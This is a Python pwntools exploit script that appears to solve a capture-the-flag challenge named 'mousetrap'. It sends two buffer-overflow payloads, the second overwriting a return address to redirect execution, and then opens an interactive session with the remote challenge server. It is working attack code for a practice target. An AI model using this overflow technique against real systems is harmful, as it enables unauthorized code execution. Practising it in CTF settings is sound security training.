#!/usr/bin/env python3

from pwn import *

exe = context.binary = ELF('./mousetrap')

host = args.HOST or 'cha.hackpack.club'
port = int(args.PORT or 41719)

def local(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())


io = start()

io.recvuntil("Name: ")
payload = (
    b"A" * 24 +
    p8(0xff)
)
io.send(payload)

io.recvuntil(":")
payload = (
    b"A" * 24 +
    p64(0x40071B)  # cheeeeeeeese
)
io.sendline(payload)

io.interactive()
